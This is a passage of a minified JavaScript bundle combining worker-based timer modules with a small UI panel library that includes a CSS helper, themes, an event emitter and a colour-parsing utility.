
        !function (e, t) {
            "object" == typeof exports && "undefined" != typeof module ? t(exports) : "function" == typeof define && define.amd ? define(["exports"], t) : t((e = "undefined" != typeof globalThis ? globalThis : e || self).fastUniqueNumbers = {})
        }(this, function (e) {
            "use strict";
            function t(e) {
                var t = a.get(e)
                    , i = void 0 === t ? e.size : t < 1073741824 ? t + 1 : 0;
                if (e.has(i))
                    if (e.size < 536870912)
                        for (; e.has(i);)
                            i = Math.floor(1073741824 * Math.random());
                    else {
                        if (e.size > s)
                            throw new Error("Congratulations, you created a collection of unique numbers which uses all available integers!");
                        for (; e.has(i);)
                            i = Math.floor(Math.random() * s)
                    }
                return o(e, i)
            }
            function i(e) {
                var t = r(e);
                return e.add(t),
                    t
            }
            var n, r, o, a, s = void 0 === Number.MAX_SAFE_INTEGER ? 9007199254740991 : Number.MAX_SAFE_INTEGER, _ = new WeakMap;
            o = function (e, t) {
                return n.set(e, t),
                    t
            }
                ,
                a = n = _,
                r = t;
            e.addUniqueNumber = i,
                e.generateUniqueNumber = t,
                Object.defineProperty(e, "__esModule", {
                    value: !0
                })
        }),
            function (e, t) {
                "object" == typeof exports && "undefined" != typeof module ? t(exports, require("fast-unique-numbers")) : "function" == typeof define && define.amd ? define(["exports", "fast-unique-numbers"], t) : t((e = "undefined" != typeof globalThis ? globalThis : e || self).workerTimersBroker = {}, e.fastUniqueNumbers)
            }(this, function (e, r) {
                "use strict";
                e.load = function (e) {
                    var o = new Map([[0, function () { }
                    ]])
                        , a = new Map([[0, function () { }
                        ]])
                        , s = new Map
                        , n = new Worker(e);
                    return n.addEventListener("message", function (e) {
                        e = e.data;
                        if (void 0 !== e.method && "call" === e.method) {
                            var t = e.params
                                , i = t.timerId
                                , t = t.timerType;
                            if ("interval" === t) {
                                var n = o.get(i);
                                if ("number" == typeof n) {
                                    var r = s.get(n);
                                    if (void 0 === r || r.timerId !== i || r.timerType !== t)
                                        throw new Error("The timer is in an undefined state.")
                                } else {
                                    if (void 0 === n)
                                        throw new Error("The timer is in an undefined state.");
                                    n()
                                }
                            } else if ("timeout" === t) {
                                r = a.get(i);
                                if ("number" == typeof r) {
                                    var n = s.get(r);
                                    if (void 0 === n || n.timerId !== i || n.timerType !== t)
                                        throw new Error("The timer is in an undefined state.")
                                } else {
                                    if (void 0 === r)
                                        throw new Error("The timer is in an undefined state.");
                                    r(),
                                        a.delete(i)
                                }
                            }
                        } else {
                            if (null !== e.error || "number" != typeof e.id)
                                throw n = e.error.message,
                                new Error(n);
                            t = e.id,
                                r = s.get(t);
                            if (void 0 === r)
                                throw new Error("The timer is in an undefined state.");
                            i = r.timerId,
                                n = r.timerType;
                            s.delete(t),
                                ("interval" === n ? o : a).delete(i)
                        }
                    }),
                    {
                        clearInterval: function (e) {
                            var t = r.generateUniqueNumber(s);
                            s.set(t, {
                                timerId: e,
                                timerType: "interval"
                            }),
                                o.set(e, t),
                                n.postMessage({
                                    id: t,
                                    method: "clear",
                                    params: {
                                        timerId: e,
                                        timerType: "interval"
                                    }
                                })
                        },
                        clearTimeout: function (e) {
                            var t = r.generateUniqueNumber(s);
                            s.set(t, {
                                timerId: e,
                                timerType: "timeout"
                            }),
                                a.set(e, t),
                                n.postMessage({
                                    id: t,
                                    method: "clear",
                                    params: {
                                        timerId: e,
                                        timerType: "timeout"
                                    }
                                })
                        },
                        setInterval: function (e, t) {
                            var i = r.generateUniqueNumber(o);
                            return o.set(i, function () {
                                e(),
                                    "function" == typeof o.get(i) && n.postMessage({
                                        id: null,
                                        method: "set",
                                        params: {
                                            delay: t,
                                            now: performance.now(),
                                            timerId: i,
                                            timerType: "interval"
                                        }
                                    })
                            }),
                                n.postMessage({
                                    id: null,
                                    method: "set",
                                    params: {
                                        delay: t,
                                        now: performance.now(),
                                        timerId: i,
                                        timerType: "interval"
                                    }
                                }),
                                i
                        },
                        setTimeout: function (e, t) {
                            var i = r.generateUniqueNumber(a);
                            return a.set(i, e),
                                n.postMessage({
                                    id: null,
                                    method: "set",
                                    params: {
                                        delay: t,
                                        now: performance.now(),
                                        timerId: i,
                                        timerType: "timeout"
                                    }
                                }),
                                i
                        }
                    }
                }
                    ,
                    Object.defineProperty(e, "__esModule", {
                        value: !0
                    })
            }),
            function (e, t) {
                "object" == typeof exports && "undefined" != typeof module ? t(exports, require("worker-timers-broker")) : "function" == typeof define && define.amd ? define(["exports", "worker-timers-broker"], t) : t((e = "undefined" != typeof globalThis ? globalThis : e || self).workerTimers = {}, e.workerTimersBroker)
            }(this, function (e, t) {
                "use strict";
                var i, n = null, r = (i = t.load,
                    function () {
                        var e, t;
                        return null === n && (e = new Blob(['(()=>{var e={67:(e,t,r)=>{var o,i;void 0===(i="function"==typeof(o=function(){"use strict";var e=new Map,t=new Map,r=function(t){var r=e.get(t);if(void 0===r)throw new Error(\'There is no interval scheduled with the given id "\'.concat(t,\'".\'));clearTimeout(r),e.delete(t)},o=function(e){var r=t.get(e);if(void 0===r)throw new Error(\'There is no timeout scheduled with the given id "\'.concat(e,\'".\'));clearTimeout(r),t.delete(e)},i=function(e,t){var r,o=performance.now();return{expected:o+(r=e-Math.max(0,o-t)),remainingDelay:r}},n=function e(t,r,o,i){var n=performance.now();n>o?postMessage({id:null,method:"call",params:{timerId:r,timerType:i}}):t.set(r,setTimeout(e,o-n,t,r,o,i))},a=function(t,r,o){var a=i(t,o),s=a.expected,d=a.remainingDelay;e.set(r,setTimeout(n,d,e,r,s,"interval"))},s=function(e,r,o){var a=i(e,o),s=a.expected,d=a.remainingDelay;t.set(r,setTimeout(n,d,t,r,s,"timeout"))};addEventListener("message",(function(e){var t=e.data;try{if("clear"===t.method){var i=t.id,n=t.params,d=n.timerId,c=n.timerType;if("interval"===c)r(d),postMessage({error:null,id:i});else{if("timeout"!==c)throw new Error(\'The given type "\'.concat(c,\'" is not supported\'));o(d),postMessage({error:null,id:i})}}else{if("set"!==t.method)throw new Error(\'The given method "\'.concat(t.method,\'" is not supported\'));var u=t.params,l=u.delay,p=u.now,m=u.timerId,v=u.timerType;if("interval"===v)a(l,m,p);else{if("timeout"!==v)throw new Error(\'The given type "\'.concat(v,\'" is not supported\'));s(l,m,p)}}}catch(e){postMessage({error:{message:e.message},id:t.id,result:null})}}))})?o.call(t,r,t,e):o)||(e.exports=i)}},t={};function r(o){var i=t[o];if(void 0!==i)return i.exports;var n=t[o]={exports:{}};return e[o](n,n.exports,r),n.exports}r.n=e=>{var t=e&&e.__esModule?()=>e.default:()=>e;return r.d(t,{a:t}),t},r.d=(e,t)=>{for(var o in t)r.o(t,o)&&!r.o(e,o)&&Object.defineProperty(e,o,{enumerable:!0,get:t[o]})},r.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t),(()=>{"use strict";r(67)})()})();'], {
                            type: "application/javascript; charset=utf-8"
                        }),
                            t = URL.createObjectURL(e),
                            (n = i(t)).setTimeout(function () {
                                return URL.revokeObjectURL(t)
                            }, 0)),
                            n
                    }
                );
                e.clearInterval = function (e) {
                    return r().clearInterval(e)
                }
                    ,
                    e.clearTimeout = function (e) {
                        return r().clearTimeout(e)
                    }
                    ,
                    e.setInterval = function (e, t) {
                        return r().setInterval(e, t)
                    }
                    ,
                    e.setTimeout = function (e, t) {
                        return r().setTimeout(e, t)
                    }
                    ,
                    Object.defineProperty(e, "__esModule", {
                        value: !0
                    })
            }),
            !function (e, t) {
                "object" == typeof exports && "object" == typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define("yusukefy", [], t) : "object" == typeof exports ? exports.yusukefy = t() : e.yusukefy = t()
            }(this, function () {
                return i = [function (e, t, i) {
                    function n(e, t, i) {
                        var n, r, o = _[t];
                        if (void 0 === o && (n = s(t = t),
                            r = a(n),
                            o = _[n] = _[t] = _[r] = r),
                            o) {
                            if (void 0 === i)
                                return e.style[o];
                            e.style[o] = E(o, i)
                        }
                    }
                    function r() {
                        if (2 === arguments.length)
                            if ("string" == typeof arguments[1])
                                arguments[0].style.cssText = arguments[1];
                            else {
                                var e, t = arguments[0], i = arguments[1];
                                for (e in i)
                                    i.hasOwnProperty(e) && n(t, e, i[e])
                            }
                        else
                            n(arguments[0], arguments[1], arguments[2])
                    }
                    var a = i(18)
                        , s = i(19)
                        , _ = {
                            float: "cssFloat"
                        }
                        , E = i(22);
                    e.exports = r,
                        e.exports.set = r,
                        e.exports.get = function (i, e) {
                            return Array.isArray(e) ? e.reduce(function (e, t) {
                                return e[t] = n(i, t || ""),
                                    e
                            }, {}) : n(i, e || "")
                        }
                }
                    , function (e, t, i) {
                        "use strict";
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        }),
                            t.theme = void 0;
                        var n = function (e, t, i) {
                            return t && a(e.prototype, t),
                                i && a(e, i),
                                e
                        }
                            , i = i(9)
                            , i = (i && i.__esModule,
                                n(o, [{
                                    key: "Set",
                                    value: function (e) {
                                        Object.assign(this, r, e)
                                    }
                                }]),
                                o)
                            , r = {
                                name: "BaseTheme",
                                colors: {
                                    menuBarBackground: "black",
                                    menuBarText: "black",
                                    panelBackground: "black",
                                    componentBackground: "black",
                                    componentBackgroundHover: "black",
                                    componentForeground: "black",
                                    componentActive: "black",
                                    textPrimary: "black",
                                    textSecondary: "black",
                                    textHover: "black",
                                    textActive: "black"
                                },
                                sizing: {
                                    menuBarHeight: "25px",
                                    componentHeight: "20px",
                                    componentSpacing: "5px",
                                    labelWidth: "42%"
                                }
                            };
                        function o() {
                            if (!(this instanceof o))
                                throw new TypeError("Cannot call a class as a function")
                        }
                        function a(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        t.theme = new i
                    }
                    , function (e, t, i) {
                        "use strict";
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var i = i(0)
                            , n = i && i.__esModule ? i : {
                                default: i
                            };
                        t.default = function (e, t, i) {
                            e = e.appendChild(document.createElement("div"));
                            return e.classList.add("yusukefy-component-container"),
                                (0,
                                    n.default)(e, {
                                        position: "relative",
                                        "min-height": i.sizing.componentHeight,
                                        "margin-bottom": i.sizing.componentSpacing
                                    }),
                                e
                        }
                            ,
                            e.exports = t.default
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = i(31);
                        e.exports = n,
                            e.exports.csjs = n,
                            e.exports.getCss = i(45)
                    }
                    , function (a, e, s) {
                        var _;
                        !function (e) {
                            "use strict";
                            function t() { }
                            function o(e, t) {
                                for (var i = e.length; i--;)
                                    if (e[i].listener === t)
                                        return i;
                                return -1
                            }
                            function i(e) {
                                return function () {
                                    return this[e].apply(this, arguments)
                                }
                            }
                            var n = t.prototype
                                , r = e.EventEmitter;
                            n.getListeners = function (e) {
                                var t, i, n = this._getEvents();
                                if (e instanceof RegExp)
                                    for (i in t = {},
                                        n)
                                        n.hasOwnProperty(i) && e.test(i) && (t[i] = n[i]);
                                else
                                    t = n[e] || (n[e] = []);
                                return t
                            }
                                ,
                                n.flattenListeners = function (e) {
                                    for (var t = [], i = 0; i < e.length; i += 1)
                                        t.push(e[i].listener);
                                    return t
                                }
                                ,
                                n.getListenersAsObject = function (e) {
                                    var t, i = this.getListeners(e);
                                    return i instanceof Array && ((t = {})[e] = i),
                                        t || i
                                }
                                ,
                                n.addListener = function (e, t) {
                                    if (!function e(t) {
                                        return "function" == typeof t || t instanceof RegExp || !(!t || "object" != typeof t) && e(t.listener)
                                    }(t))
                                        throw new TypeError("listener must be a function");
                                    var i, n = this.getListenersAsObject(e), r = "object" == typeof t;
                                    for (i in n)
                                        n.hasOwnProperty(i) && -1 === o(n[i], t) && n[i].push(r ? t : {
                                            listener: t,
                                            once: !1
                                        });
                                    return this
                                }
                                ,
                                n.on = i("addListener"),
                                n.addOnceListener = function (e, t) {
                                    return this.addListener(e, {
                                        listener: t,
                                        once: !0
                                    })
                                }
                                ,
                                n.once = i("addOnceListener"),
                                n.defineEvent = function (e) {
                                    return this.getListeners(e),
                                        this
                                }
                                ,
                                n.defineEvents = function (e) {
                                    for (var t = 0; t < e.length; t += 1)
                                        this.defineEvent(e[t]);
                                    return this
                                }
                                ,
                                n.removeListener = function (e, t) {
                                    var i, n, r = this.getListenersAsObject(e);
                                    for (n in r)
                                        r.hasOwnProperty(n) && -1 !== (i = o(r[n], t)) && r[n].splice(i, 1);
                                    return this
                                }
                                ,
                                n.off = i("removeListener"),
                                n.addListeners = function (e, t) {
                                    return this.manipulateListeners(!1, e, t)
                                }
                                ,
                                n.removeListeners = function (e, t) {
                                    return this.manipulateListeners(!0, e, t)
                                }
                                ,
                                n.manipulateListeners = function (e, t, i) {
                                    var n, r, o = e ? this.removeListener : this.addListener, a = e ? this.removeListeners : this.addListeners;
                                    if ("object" != typeof t || t instanceof RegExp)
                                        for (n = i.length; n--;)
                                            o.call(this, t, i[n]);
                                    else
                                        for (n in t)
                                            t.hasOwnProperty(n) && (r = t[n]) && ("function" == typeof r ? o : a).call(this, n, r);
                                    return this
                                }
                                ,
                                n.removeEvent = function (e) {
                                    var t, i = typeof e, n = this._getEvents();
                                    if ("string" == i)
                                        delete n[e];
                                    else if (e instanceof RegExp)
                                        for (t in n)
                                            n.hasOwnProperty(t) && e.test(t) && delete n[t];
                                    else
                                        delete this._events;
                                    return this
                                }
                                ,
                                n.removeAllListeners = i("removeEvent"),
                                n.emitEvent = function (e, t) {
                                    var i, n, r, o, a = this.getListenersAsObject(e);
                                    for (o in a)
                                        if (a.hasOwnProperty(o))
                                            for (i = a[o].slice(0),
                                                r = 0; r < i.length; r++)
                                                n = i[r],
                                                    !0 === n.once && this.removeListener(e, n.listener),
                                                    n.listener.apply(this, t || []) === this._getOnceReturnValue() && this.removeListener(e, n.listener);
                                    return this
                                }
                                ,
                                n.trigger = i("emitEvent"),
                                n.emit = function (e) {
                                    var t = Array.prototype.slice.call(arguments, 1);
                                    return this.emitEvent(e, t)
                                }
                                ,
                                n.setOnceReturnValue = function (e) {
                                    return this._onceReturnValue = e,
                                        this
                                }
                                ,
                                n._getOnceReturnValue = function () {
                                    return !this.hasOwnProperty("_onceReturnValue") || this._onceReturnValue
                                }
                                ,
                                n._getEvents = function () {
                                    return this._events || (this._events = {})
                                }
                                ,
                                t.noConflict = function () {
                                    return e.EventEmitter = r,
                                        t
                                }
                                ,
                                void 0 !== (_ = function () {
                                    return t
                                }
                                    .call(e, s, e, a)) && (a.exports = _)
                        }("undefined" != typeof window ? window : this || {})
                    }
                    , function (e, t, i) {
                        "use strict";
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var i = i(0)
                            , n = i && i.__esModule ? i : {
                                default: i
                            };
                        t.default = function (e, t, i) {
                            e = e.appendChild(document.createElement("div")),
                                (0,
                                    n.default)(e, {
                                        left: 0,
                                        width: "calc(" + i.sizing.labelWidth + " - 2%)",
                                        display: "inline-block",
                                        "margin-right": "2%",
                                        verticalAlign: "top"
                                    }),
                                e = e.appendChild(document.createElement("div"));
                            return e.innerHTML = t,
                                (0,
                                    n.default)(e, {
                                        color: i.colors.textPrimary,
                                        display: "inline-block",
                                        verticalAlign: "sub",
                                        "min-height": i.sizing.componentHeight,
                                        "line-height": i.sizing.componentHeight
                                    }),
                                e
                        }
                            ,
                            e.exports = t.default
                    }
                    , function (e, t, i) {
                        "use strict";
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var i = i(0)
                            , o = i && i.__esModule ? i : {
                                default: i
                            };
                        t.default = function (e, t, i, n, r) {
                            e = e.appendChild(document.createElement("input")),
                                e.type = "text",
                                e.value = t,
                                t = {
                                    position: "absolute",
                                    backgroundColor: i.colors.componentBackground,
                                    paddingLeft: "1%",
                                    height: i.sizing.componentHeight,
                                    width: n,
                                    display: "inline-block",
                                    overflow: "hidden",
                                    border: "none",
                                    "font-family": "'Hack', monospace",
                                    "font-size": "11px",
                                    color: i.colors.textSecondary,
                                    userSelect: "text",
                                    cursor: "text",
                                    lineHeight: i.sizing.componentHeight,
                                    wordBreak: "break-all",
                                    "box-sizing": "border-box",
                                    "-moz-box-sizing": "border-box",
                                    "-webkit-box-sizing": "border-box"
                                };
                            return r || (t.right = 0),
                                (0,
                                    o.default)(e, t),
                                e
                        }
                            ,
                            e.exports = t.default
                    }
                    , function (e, t, i) {
                        "use strict";
                        function r(e) {
                            return e instanceof o
                        }
                        function o() { }
                        e.exports = {
                            makeComposition: function (e, t, i) {
                                var n = e.join(" ");
                                return Object.create(o.prototype, {
                                    classNames: {
                                        value: Object.freeze(e),
                                        configurable: !1,
                                        writable: !1,
                                        enumerable: !0
                                    },
                                    unscoped: {
                                        value: Object.freeze(t),
                                        configurable: !1,
                                        writable: !1,
                                        enumerable: !0
                                    },
                                    className: {
                                        value: n,
                                        configurable: !1,
                                        writable: !1,
                                        enumerable: !0
                                    },
                                    selector: {
                                        value: e.map(function (e) {
                                            return i ? e : "." + e
                                        }).join(", "),
                                        configurable: !1,
                                        writable: !1,
                                        enumerable: !0
                                    },
                                    toString: {
                                        value: function () {
                                            return n
                                        },
                                        configurable: !1,
                                        writeable: !1,
                                        enumerable: !1
                                    }
                                })
                            },
                            isComposition: r,
                            ignoreComposition: function (e) {
                                return e.reduce(function (i, n) {
                                    return r(n) && n.classNames.forEach(function (e, t) {
                                        i[e] = n.unscoped[t]
                                    }),
                                        i
                                }, {})
                            }
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = /(@\S*keyframes\s*)([^{\s]*)/.source
                            , r = /(?!(?:[^*\/]|\*[^\/]|\/[^*])*\*+\/)/.source
                            , o = new RegExp(/(\.)(?!\d)([^\s\.,{\[>+~#:)]*)(?![^{]*})/.source + r, "g")
                            , n = new RegExp(n + r, "g");
                        e.exports = {
                            classRegex: o,
                            keyframesRegex: n,
                            ignoreComments: r
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        e.exports = {
                            light: {
                                name: "Light",
                                colors: {
                                    menuBarBackground: "rgb(227, 227, 227)",
                                    menuBarText: "rgb(36, 36, 36)",
                                    panelBackground: "rgb(227, 227, 227)",
                                    componentBackground: "rgb(204, 204, 204)",
                                    componentBackgroundHover: "rgb(190, 190, 190)",
                                    componentForeground: "rgb(105, 105, 105)",
                                    componentActive: "rgb(36, 36, 36)",
                                    textPrimary: "rgb(36, 36, 36)",
                                    textSecondary: "rgb(87, 87, 87)",
                                    textHover: "rgb(204, 204, 204)",
                                    textActive: "rgb(204, 204, 204)"
                                }
                            },
                            dark: {
                                name: "Dark",
                                colors: {
                                    menuBarBackground: "rgb(35, 35, 35)",
                                    menuBarText: "rgb(235, 235, 235)",
                                    panelBackground: "rgb(35, 35, 35)",
                                    componentBackground: "rgb(54, 54, 54)",
                                    componentBackgroundHover: "rgb(76, 76, 76)",
                                    componentForeground: "rgb(112, 112, 112)",
                                    componentActive: "rgb(202, 202, 202)",
                                    textPrimary: "rgb(235, 235, 235)",
                                    textSecondary: "rgb(181, 181, 181)",
                                    textHover: "rgb(235, 235, 235)",
                                    textActive: "rgb(54, 54, 54)"
                                }
                            },
                            yorha: {
                                name: "YoRHa",
                                colors: {
                                    menuBarBackground: "#CCC8B1",
                                    menuBarText: "#454138",
                                    panelBackground: "#CCC8B1",
                                    componentBackground: "#BAB5A1",
                                    componentBackgroundHover: "#877F6E",
                                    componentForeground: "#454138",
                                    componentActive: "#978F7E",
                                    textPrimary: "#454138",
                                    textSecondary: "#454138",
                                    textHover: "#CCC8B1",
                                    textActive: "#CCC8B1"
                                },
                                font: {
                                    fontFamily: "helvetica, sans-serif",
                                    fontSize: "14px",
                                    fontWeight: "100"
                                }
                            }
                        }
                    }
                    , function (t, i, e) {
                        !function () {
                            "use strict";
                            function e(e) {
                                return "number" == typeof e && !isNaN(e) || !!(e = (e || "").toString().trim()) && !isNaN(e)
                            }
                            (i = void 0 !== t && t.exports ? t.exports = e : i).isNumeric = e
                        }()
                    }
                    , function (e, t, i) {
                        "use strict";
                        e.exports = " css "
                    }
                    , function (e, t, i) {
                        "use strict";
                        e.exports = i(44)
                    }
                    , function (e, t) {
                        function i(e, t) {
                            if (t = t || {},
                                void 0 === e)
                                throw new Error("insert-css: You need to provide a CSS string. Usage: insertCss(cssString[, options]).");
                            var i, n = !0 === t.prepend ? "prepend" : "append", t = void 0 !== t.container ? t.container : document.querySelector("head"), r = o.indexOf(t);
                            return -1 === r && (r = o.push(t) - 1,
                                a[r] = {}),
                                void 0 !== a[r] && void 0 !== a[r][n] ? i = a[r][n] : (i = a[r][n] = ((r = document.createElement("style")).setAttribute("type", "text/css"),
                                    r),
                                    "prepend" == n ? t.insertBefore(i, t.childNodes[0]) : t.appendChild(i)),
                                65279 === e.charCodeAt(0) && (e = e.substr(1, e.length)),
                                i.styleSheet ? i.styleSheet.cssText += e : i.textContent += e,
                                i
                        }
                        var o = []
                            , a = [];
                        e.exports = i,
                            e.exports.insertCss = i
                    }
                    , function (e, t, i) {
                        var u, n, r, o, d, T, A, h, l, I, a, c, s, O;
                        function g(e, t) {
                            var i, n, r, o, a, s, _, E;
                            return t = t || {},
                                (e = e || "") instanceof g ? e : this instanceof g ? (n = {
                                    r: 0,
                                    g: 0,
                                    b: 0
                                },
                                    s = a = o = null,
                                    E = _ = !(r = 1),
                                    r = D(r = "object" == typeof (i = "string" == typeof (i = e) ? function (e) {
                                        e = e.replace(d, "").replace(T, "").toLowerCase();
                                        var t, i = !1;
                                        if (c[e])
                                            e = c[e],
                                                i = !0;
                                        else if ("transparent" == e)
                                            return {
                                                r: 0,
                                                g: 0,
                                                b: 0,
                                                a: 0,
                                                format: "name"
                                            };
                                        return (t = O.rgb.exec(e)) ? {
                                            r: t[1],
                                            g: t[2],
                                            b: t[3]
                                        } : (t = O.rgba.exec(e)) ? {
                                            r: t[1],
                                            g: t[2],
                                            b: t[3],
                                            a: t[4]
                                        } : (t = O.hsl.exec(e)) ? {
                                            h: t[1],
                                            s: t[2],
                                            l: t[3]
                                        } : (t = O.hsla.exec(e)) ? {
                                            h: t[1],
                                            s: t[2],
                                            l: t[3],
                                            a: t[4]
                                        } : (t = O.hsv.exec(e)) ? {
                                            h: t[1],
                                            s: t[2],
                                            v: t[3]
                                        } : (t = O.hsva.exec(e)) ? {
                                            h: t[1],
                                            s: t[2],
                                            v: t[3],
                                            a: t[4]
                                        } : (t = O.hex8.exec(e)) ? {
                                            r: f(t[1]),
                                            g: f(t[2]),
                                            b: f(t[3]),
                                            a: H(t[4]),
                                            format: i ? "name" : "hex8"
                                        } : (t = O.hex6.exec(e)) ? {
                                            r: f(t[1]),
                                            g: f(t[2]),
                                            b: f(t[3]),
                                            format: i ? "name" : "hex"
                                        } : (t = O.hex4.exec(e)) ? {
                                            r: f(t[1] + "" + t[1]),
                                            g: f(t[2] + "" + t[2]),
                                            b: f(t[3] + "" + t[3]),
                                            a: H(t[4] + "" + t[4]),
                                            format: i ? "name" : "hex8"
                                        } : !!(t = O.hex3.exec(e)) && {
                                            r: f(t[1] + "" + t[1]),
                                            g: f(t[2] + "" + t[2]),
                                            b: f(t[3] + "" + t[3]),
                                            format: i ? "name" : "hex"
                                        }
                                    }(i) : i) && (P(i.r) && P(i.g) && P(i.b) ? (n = function (e, t, i) {
                                        return {
                                            r: 255 * v(e, 255),
                                            g: 255 * v(t, 255),
                                            b: 255 * v(i, 255)
                                        }
                                    }(i.r, i.g, i.b),
                                        _ = !0,
                                        E = "%" === String(i.r).substr(-1) ? "prgb" : "rgb") : P(i.h) && P(i.s) && P(i.v) ? (o = G(i.s),
                                            a = G(i.v),
                                            n = function (e, t, i) {
                                                e = 6 * v(e, 360),
                                                    t = v(t, 100),
                                                    i = v(i, 100);
                                                var n = u.floor(e)
                                                    , e = e - n
                                                    , r = i * (1 - t)
                                                    , o = i * (1 - e * t)
                                                    , e = i * (1 - (1 - e) * t)
                                                    , t = n % 6;
                                                return {
                                                    r: 255 * [i, o, r, r, e, i][t],
                                                    g: 255 * [e, i, i, o, r, r][t],
                                                    b: 255 * [r, r, e, i, i, o][t]
                                                }
                                            }(i.h, o, a),
                                            _ = !0,
                                            E = "hsv") : P(i.h) && P(i.s) && P(i.l) && (o = G(i.s),
                                                s = G(i.l),
                                                n = function (e, t, i) {
                                                    function n(e, t, i) {
                                                        return i < 0 && (i += 1),
                                                            1 < i && --i,
                                                            i < 1 / 6 ? e + 6 * (t - e) * i : i < .5 ? t : i < 2 / 3 ? e + (t - e) * (2 / 3 - i) * 6 : e
                                                    }
                                                    var r, o, a;
                                                    e = v(e, 360),
                                                        t = v(t, 100),
                                                        i = v(i, 100),
                                                        0 === t ? r = o = a = i : (r = n(t = 2 * i - (i = i < .5 ? i * (1 + t) : i + t - i * t), i, e + 1 / 3),
                                                            o = n(t, i, e),
                                                            a = n(t, i, e - 1 / 3));
                                                    return {
                                                        r: 255 * r,
                                                        g: 255 * o,
                                                        b: 255 * a
                                                    }
                                                }(i.h, o, s),
                                                _ = !0,
                                                E = "hsl"),
                                        i.hasOwnProperty("a")) ? i.a : r),
                                    a = {
                                        ok: _,
                                        format: i.format || E,
                                        r: l(255, I(n.r, 0)),
                                        g: l(255, I(n.g, 0)),
                                        b: l(255, I(n.b, 0)),
                                        a: r
                                    },
                                    this._originalInput = e,
                                    this._r = a.r,
                                    this._g = a.g,
                                    this._b = a.b,
                                    this._a = a.a,
                                    this._roundA = h(100 * this._a) / 100,
                                    this._format = t.format || a.format,
                                    this._gradientType = t.gradientType,
                                    this._r < 1 && (this._r = h(this._r)),
                                    this._g < 1 && (this._g = h(this._g)),
                                    this._b < 1 && (this._b = h(this._b)),
                                    this._ok = a.ok,
                                    void (this._tc_id = A++)) : new g(e, t)
                        }
                        function _(e, t, i) {
                            e = v(e, 255),
                                t = v(t, 255),
                                i = v(i, 255);
                            var n, r = I(e, t, i), o = l(e, t, i), a = (r + o) / 2;
                            if (r == o)
                                n = _ = 0;
                            else {
                                var s = r - o
                                    , _ = .5 < a ? s / (2 - r - o) : s / (r + o);
                                switch (r) {
                                    case e:
                                        n = (t - i) / s + (t < i ? 6 : 0);
                                        break;
                                    case t:
                                        n = (i - e) / s + 2;
                                        break;
                                    case i:
                                        n = (e - t) / s + 4
                                }
                                n /= 6
                            }
                            return {
                                h: n,
                                s: _,
                                l: a
                            }
                        }
                        function E(e, t, i) {
                            e = v(e, 255),
                                t = v(t, 255),
                                i = v(i, 255);
                            var n, r = I(e, t, i), o = l(e, t, i), a = r, s = r - o, _ = 0 === r ? 0 : s / r;
                            if (r == o)
                                n = 0;
                            else {
                                switch (r) {
                                    case e:
                                        n = (t - i) / s + (t < i ? 6 : 0);
                                        break;
                                    case t:
                                        n = (i - e) / s + 2;
                                        break;
                                    case i:
                                        n = (e - t) / s + 4
                                }
                                n /= 6
                            }
                            return {
                                h: n,
                                s: _,
                                v: a
                            }
                        }
                        function p(e, t, i, n) {
                            e = [L(h(e).toString(16)), L(h(t).toString(16)), L(h(i).toString(16))];
                            return n && e[0].charAt(0) == e[0].charAt(1) && e[1].charAt(0) == e[1].charAt(1) && e[2].charAt(0) == e[2].charAt(1) ? e[0].charAt(0) + e[1].charAt(0) + e[2].charAt(0) : e.join("")
                        }
                        function R(e, t, i, n) {
                            return [L(y(n)), L(h(e).toString(16)), L(h(t).toString(16)), L(h(i).toString(16))].join("")
                        }
                        function C(e, t) {
                            t = 0 === t ? 0 : t || 10;
                            e = g(e).toHsl();
                            return e.s -= t / 100,
                                e.s = M(e.s),
                                g(e)
                        }
                        function b(e, t) {
                            t = 0 === t ? 0 : t || 10;
                            e = g(e).toHsl();
                            return e.s += t / 100,
                                e.s = M(e.s),
                                g(e)
                        }
                        function N(e) {
                            return g(e).desaturate(100)
                        }
                        function S(e, t) {
                            t = 0 === t ? 0 : t || 10;
                            e = g(e).toHsl();
                            return e.l += t / 100,
                                e.l = M(e.l),
                                g(e)
                        }
                        function m(e, t) {
                            t = 0 === t ? 0 : t || 10;
                            e = g(e).toRgb();
                            return e.r = I(0, l(255, e.r - h(-t / 100 * 255))),
                                e.g = I(0, l(255, e.g - h(-t / 100 * 255))),
                                e.b = I(0, l(255, e.b - h(-t / 100 * 255))),
                                g(e)
                        }
                        function z(e, t) {
                            t = 0 === t ? 0 : t || 10;
                            e = g(e).toHsl();
                            return e.l -= t / 100,
                                e.l = M(e.l),
                                g(e)
                        }
                        function B(e, t) {
                            e = g(e).toHsl(),
                                t = (e.h + t) % 360;
                            return e.h = t < 0 ? 360 + t : t,
                                g(e)
                        }
                        function w(e) {
                            e = g(e).toHsl();
                            return e.h = (e.h + 180) % 360,
                                g(e)
                        }
                        function W(e) {
                            var t = g(e).toHsl()
                                , i = t.h;
                            return [g(e), g({
                                h: (i + 120) % 360,
                                s: t.s,
                                l: t.l
                            }), g({
                                h: (i + 240) % 360,
                                s: t.s,
                                l: t.l
                            })]
                        }
                        function V(e) {
                            var t = g(e).toHsl()
                                , i = t.h;
                            return [g(e), g({
                                h: (i + 90) % 360,
                                s: t.s,
                                l: t.l
                            }), g({
                                h: (i + 180) % 360,
                                s: t.s,
                                l: t.l
                            }), g({
                                h: (i + 270) % 360,
                                s: t.s,
                                l: t.l
                            })]
                        }
                        function k(e) {
                            var t = g(e).toHsl()
                                , i = t.h;
                            return [g(e), g({
                                h: (i + 72) % 360,
                                s: t.s,
                                l: t.l
                            }), g({
                                h: (i + 216) % 360,
                                s: t.s,
                                l: t.l
                            })]
                        }
                        function K(e, t, i) {
                            t = t || 6,
                                i = i || 30;
                            var n = g(e).toHsl()
                                , r = 360 / i
                                , o = [g(e)];
                            for (n.h = (n.h - (r * t >> 1) + 720) % 360; --t;)
                                n.h = (n.h + r) % 360,
                                    o.push(g(n));
                            return o
                        }
